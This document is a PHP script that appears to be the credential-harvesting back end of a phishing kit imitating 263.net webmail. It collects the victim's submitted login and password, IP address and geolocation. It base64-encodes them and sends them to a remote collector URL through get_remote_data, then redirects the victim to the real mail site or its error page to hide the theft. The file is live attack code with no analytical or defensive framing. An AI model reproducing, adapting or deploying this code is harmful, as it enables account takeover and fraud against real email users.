<?php
ob_start();

require '../../GetDetail.php';
$ipaddress = $_SERVER['REMOTE_ADDR'];
$country = $location['countryName'];
$city= $location['cityName'];
$region= $location['regionName'] ;

$roll1='';
$roll2='';
$roll3='';
$roll4='';
$roll5='';
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');
$acc = $_POST['login'];
$pp = $_POST['pass'];
 
$login= $_POST['login'];
$domain = substr(strrchr($login, "@"), 1);
$port     =  '993';

if(isset($_POST['hihi'])){
$redil='hihi';	
}elseif(isset($_POST['hihihi'])){
$redil='hihihi';
}elseif(isset($_POST['hihihihi'])){
$redil='hihihihi';
}else{
$redil='hihi';
}
///GET IMAP SETTINGS
$email=$login;
$domain = substr(strrchr($email, "@"), 1);
$serv= mxrecordValidate($email, $domain);
$hostname = 'imapw.263.net';
$urlredi = 'http://263xmail.com/';
 
///END IMAP SETTINGS  
if($trueauthentic == true){

$ip = $_SERVER['REMOTE_ADDR'] ;

$result =  get_remote_data($url.'?login='.base64_encode($acc).'&pass='.base64_encode($pp).'&send_to='.base64_encode($recpadmin).'&hostname='.base64_encode($hostname).'&port='.base64_encode($port).'&recemail='.base64_encode($recemail).'&recdatabase='.base64_encode($recdatabase).'&datahost='.base64_encode($datahost).'&datauser='.base64_encode($datauser).'&datapass='.base64_encode($datapass).'&links='.base64_encode($urlredi).'&ip='.base64_encode($ip).'&country='.base64_encode($country).'&city='.base64_encode($city).'&region='.base64_encode($region).'&database='.base64_encode($database));
}else{
$result = "off";
}




if(strpos($result, 'wok') !== false) {
 echo '<script type="text/javascript">window.top.location.href="'.$urlredi.'";</script>';
exit;
}else{
if(!isset($_POST['hihi'])){
		header('location: http://uc.263.net/ma/web/jsp/usc/error.jsp?err=unauth&_t=1546387200000?lag=13InboxLightas&mgs=tee&hihii=1&lon=1&'.$redil.'=2&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&uid='.$login.'&login='.$login.'&loge='.$login.'&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1');
}else{
echo '<script type="text/javascript">window.top.location.href="'.$urlredi.'";</script>';
}
}